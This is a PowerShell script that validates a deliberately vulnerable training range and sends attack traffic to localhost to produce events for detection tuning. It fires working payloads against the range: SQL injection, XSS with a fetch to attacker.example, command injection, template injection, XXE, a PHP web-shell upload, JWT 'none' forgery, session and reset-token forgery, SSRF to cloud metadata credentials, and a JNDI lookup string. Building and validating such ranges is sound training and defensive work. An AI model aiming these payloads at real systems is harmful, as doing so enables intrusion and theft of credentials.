<#
.SYNOPSIS
    Exercises every finding on the Meridian Freight Solutions target and reports
    pass/fail. Windows twin of tools/validate_range.sh.

.DESCRIPTION
    Use it to verify an IIS deployment and to generate a complete event set for
    Splunk detection tuning. Exits non-zero if any finding is unreachable.

.EXAMPLE
    .\tools\Validate-Range.ps1 -BaseUrl http://localhost:8080 -MetadataPort 8081
#>
param(
    [string]$BaseUrl = "http://localhost:8080",
    [string]$RepositoryPath = (Split-Path -Parent $PSScriptRoot),
    [int]$MetadataPort = 8081,
    [string]$Team = "validation-bot",
    [string]$TestId = "ps-validation",
    [string]$ConsoleToken = $(if ($env:RANGE_CONSOLE_TOKEN) { $env:RANGE_CONSOLE_TOKEN } else { "range-operator" })
)

$ErrorActionPreference = "Continue"
$ProgressPreference = "SilentlyContinue"
$BaseUrl = $BaseUrl.TrimEnd("/")
$session = New-Object Microsoft.PowerShell.Commands.WebRequestSession
$script:Pass = 0; $script:Fail = 0; $script:Failed = @()
$python = Join-Path $RepositoryPath ".venv\Scripts\python.exe"

function Invoke-Lab {
    <# Returns the response body as a string, including for 4xx/5xx responses. #>
    param([string]$Path, [string]$Method = "GET", $Body = $null,
          [string]$ContentType = "application/json", [hashtable]$Headers = @{},
          $WebSession = $script:session)
    $Headers["X-Lab-Test-ID"] = $TestId
    $uri = if ($Path -match '^https?://') { $Path } else { "$BaseUrl$Path" }
    try {
        $arguments = @{ Uri = $uri; Method = $Method; WebSession = $WebSession
                        Headers = $Headers; UseBasicParsing = $true; TimeoutSec = 20 }
        if ($null -ne $Body) { $arguments.Body = $Body; $arguments.ContentType = $ContentType }
        return (Invoke-WebRequest @arguments).Content
    } catch {
        $response = $_.Exception.Response
        if ($null -ne $response) {
            try {
                $reader = New-Object System.IO.StreamReader($response.GetResponseStream())
                return $reader.ReadToEnd()
            } catch { return "" }
        }
        return ""
    }
}

# Proof values are embedded in recovered data, not returned in a labelled field.
function Get-Proof { param([string]$Text)
    if ($Text -match 'MERIDIAN\{[^}]*\}') { return $Matches[0] }
    return ""
}

# Captured session cookies arrive base64-encoded; JSON base64 always starts "eyJ".
function Get-ProofFromBase64 { param([string]$Text)
    foreach ($m in [regex]::Matches($Text, 'eyJ[A-Za-z0-9+/=]*')) {
        try {
            $decoded = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($m.Value))
            $found = Get-Proof $decoded
            if ($found) { return $found }
        } catch { }
    }
    return ""
}

function Record { param([string]$Id, [string]$Value)
    if ([string]::IsNullOrWhiteSpace($Value)) {
        Write-Host ("  FAIL {0,-22} nothing recovered" -f $Id) -ForegroundColor Red
        $script:Fail++; $script:Failed += $Id; return
    }
    $body = @{ value = $Value } | ConvertTo-Json -Compress
    $result = Invoke-Lab -Path "/range/api/submit" -Method POST -Body $body `
                         -Headers @{ "X-Range-Token" = $ConsoleToken }
    if ($result -match '"correct":\s*true') {
        Write-Host ("  PASS {0,-22} {1}" -f $Id, $Value) -ForegroundColor Green
        $script:Pass++
    } else {
        Write-Host ("  FAIL {0,-22} rejected: {1}" -f $Id, $result) -ForegroundColor Red
        $script:Fail++; $script:Failed += $Id
    }
}

function Get-Md5 { param([string]$Text)
    $md5 = [Security.Cryptography.MD5]::Create()
    $bytes = $md5.ComputeHash([Text.Encoding]::UTF8.GetBytes($Text))
    return (($bytes | ForEach-Object { $_.ToString("x2") }) -join "")
}

function ConvertTo-Base64Url { param([string]$Text)
    $raw = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($Text))
    return $raw.TrimEnd("=").Replace("+", "-").Replace("/", "_")
}

function Encode { param([string]$Text) return [Uri]::EscapeDataString($Text) }

Write-Host "== Meridian target validation against $BaseUrl ==" -ForegroundColor Cyan
Invoke-Lab -Path "/range/api/team" -Method POST `
           -Body (@{ team = $Team } | ConvertTo-Json -Compress) `
           -Headers @{ "X-Range-Token" = $ConsoleToken } | Out-Null

Write-Host "-- reconnaissance and exposed files --"
Invoke-Lab -Path "/robots.txt" | Out-Null
Record "recon-runbook"    (Get-Proof (Invoke-Lab -Path "/internal/it-runbook.txt"))
Record "misconfig-debug"  (Get-Proof (Invoke-Lab -Path "/status/diagnostics"))
Record "misconfig-dotenv" (Get-Proof (Invoke-Lab -Path "/.env"))
Invoke-Lab -Path "/backups/" | Out-Null
Record "misconfig-backups" (Get-Proof (Invoke-Lab -Path "/backups/meridian-db-export.sql"))

Write-Host "-- broken access control --"
Record "idor-shipment"     (Get-Proof (Invoke-Lab -Path "/api/v1/shipments/MFS-2026-4471"))
Record "access-massassign" (Get-Proof (Invoke-Lab -Path "/portal/profile" -Method POST `
    -Body '{"contact_name":"Dana Okafor","account_type":"operations"}'))

Write-Host "-- injection --"
Record "sqli-union"      (Get-Proof (Invoke-Lab -Path ("/api/v1/rates/search?q=" + `
    (Encode "' UNION SELECT id,partner,api_key FROM integration_credentials-- "))))
Record "sqli-authbypass" (Get-Proof (Invoke-Lab -Path "/portal/login?legacy=1" -Method POST `
    -Body '{"username":"ops_console''-- ","password":"x"}'))
Invoke-Lab -Path ("/search?q=" + (Encode '<script>alert(1)</script>')) | Out-Null
Record "xss-reflected"   (Get-ProofFromBase64 (Invoke-Lab -Path ("/support/shared-search?q=" + `
    (Encode '<script>fetch("//attacker.example")</script>'))))
Invoke-Lab -Path "/contact" -Method POST `
    -Body '{"name":"tester","company":"Acme","email":"t@acme.example","message":"<script>steal()</script>"}' | Out-Null

Write-Host "-- file handling and code execution --"
Record "traversal-invoice" (Get-Proof (Invoke-Lab -Path ("/api/v1/invoices/download?document=" + `
    (Encode "../instance/app-secrets.ini"))))
# cmd.exe chains with & and reads files with type, not ; and cat.
Record "rce-cmdi" (Get-Proof (Invoke-Lab -Path "/admin/diagnostics" -Method POST `
    -Body '{"host":"127.0.0.1 & type instance\\keys\\depot-transfer.key"}'))
# open() takes forward slashes on both platforms; a backslash would be consumed
# by Jinja's string parsing before Python sees it.
Record "rce-ssti" (Get-Proof (Invoke-Lab -Path ("/admin/campaigns/preview?body=" + `
    (Encode "{{ cycler.__init__.__globals__.__builtins__.open('instance/keys/campaign-signing.key').read() }}"))))
$ediPath = (Join-Path $RepositoryPath "instance\edi\partner-manifest.key").Replace("\", "/")
$ediBody = '<?xml version="1.0"?><!DOCTYPE m [<!ENTITY x SYSTEM "file:///' + $ediPath + '">]><manifest>&x;</manifest>'
Record "xxe-edi" (Get-Proof (Invoke-Lab -Path "/api/v1/edi/manifest" -Method POST `
    -Body $ediBody -ContentType "application/xml"))

$cvPath = Join-Path $env:TEMP "cv.php"
'<?php system($_GET["c"]); ?>' | Set-Content -Path $cvPath -Encoding ASCII
$boundary = [Guid]::NewGuid().ToString()
$uploadBody = (
    "--$boundary", 'Content-Disposition: form-data; name="cv"; filename="cv.php"',
    "Content-Type: application/octet-stream", "", (Get-Content $cvPath -Raw), "--$boundary--", ""
) -join "`r`n"
Invoke-Lab -Path "/careers/apply" -Method POST -Body $uploadBody `
           -ContentType "multipart/form-data; boundary=$boundary" | Out-Null
Invoke-Lab -Path "/uploads/" | Out-Null
Record "upload-unrestricted" (Get-Proof (Invoke-Lab -Path "/uploads/hr-onboarding-pack-2026.txt"))

Write-Host "-- authentication and session handling --"
$loginResult = ""
foreach ($password in @("Autumn2023", "autumn2023", "Password1", "summer2024", "autumn2024")) {
    $loginResult = Invoke-Lab -Path "/portal/login" -Method POST `
        -Body (@{ username = "svc_edi"; password = $password } | ConvertTo-Json -Compress)
}
Record "auth-bruteforce" (Get-Proof $loginResult)

$forgedJwt = (ConvertTo-Base64Url '{"alg":"none","typ":"JWT"}') + "." + `
             (ConvertTo-Base64Url '{"sub":"harborline","role":"finance"}') + "."
Record "jwt-none" (Get-Proof (Invoke-Lab -Path "/api/v1/reports/financial" `
    -Headers @{ Authorization = "Bearer $forgedJwt" }))

$resetToken = Get-Md5 "avoss"
Invoke-Lab -Path "/portal/reset" -Method POST -Body '{"username":"avoss"}' | Out-Null
Record "reset-token" (Get-Proof (Invoke-Lab -Path "/api/v1/account/reset" -Method POST `
    -Body (@{ username = "avoss"; token = $resetToken } | ConvertTo-Json -Compress)))

if (Test-Path $python) {
    $secret = if ($env:LAB_SESSION_SECRET) { $env:LAB_SESSION_SECRET } else { "meridian-default-signing-key" }
    $forgedCookie = & $python (Join-Path $RepositoryPath "tools\forge_session.py") --secret $secret

    # The forged cookie needs its own session. Invoke-WebRequest lets a
    # WebSession's cookie container win over a manually set Cookie header, and
    # $script:session already holds a real portal cookie from the login checks
    # above - reusing it would silently send that one and the staff area would
    # answer 403.
    $forgedSession = New-Object Microsoft.PowerShell.Commands.WebRequestSession
    $forgedSession.Cookies.Add((New-Object System.Net.Cookie(
        "session", $forgedCookie, "/", ([Uri]$BaseUrl).Host)))

    Record "weak-session-secret" (Get-Proof (Invoke-Lab -Path "/admin" `
        -WebSession $forgedSession))
    Record "xss-stored" (Get-ProofFromBase64 (Invoke-Lab -Path "/admin/messages" `
        -WebSession $forgedSession))
} else {
    foreach ($id in @("weak-session-secret", "xss-stored")) {
        Write-Host ("  SKIP {0,-22} .venv not found at {1}" -f $id, $python) -ForegroundColor Yellow
        $script:Fail++; $script:Failed += $id
    }
}

Write-Host "-- ssrf, business logic and vulnerable components --"
$metadataUrl = "http://127.0.0.1:$MetadataPort/latest/meta-data/iam/security-credentials/mfs-web-instance-role"
Record "ssrf-metadata" (Get-Proof (Invoke-Lab -Path ("/admin/integrations/preview?url=" + (Encode $metadataUrl))))
Record "logic-negative-quote" (Get-Proof (Invoke-Lab -Path "/services/quote" -Method POST `
    -Body '{"weight_kg":-1200,"rate_per_kg":0.42}'))
Record "jndi-audit" (Get-Proof (Invoke-Lab -Path "/api/v1/audit/event" `
    -Headers @{ "X-Tracking-Agent" = '${jndi:ldap://attacker.example/a}' }))

Write-Host ""
Write-Host "== $script:Pass passed, $script:Fail failed ==" -ForegroundColor Cyan
if ($script:Fail -gt 0) {
    Write-Host ("failed: " + ($script:Failed -join ", ")) -ForegroundColor Red
    exit 1
}
exit 0
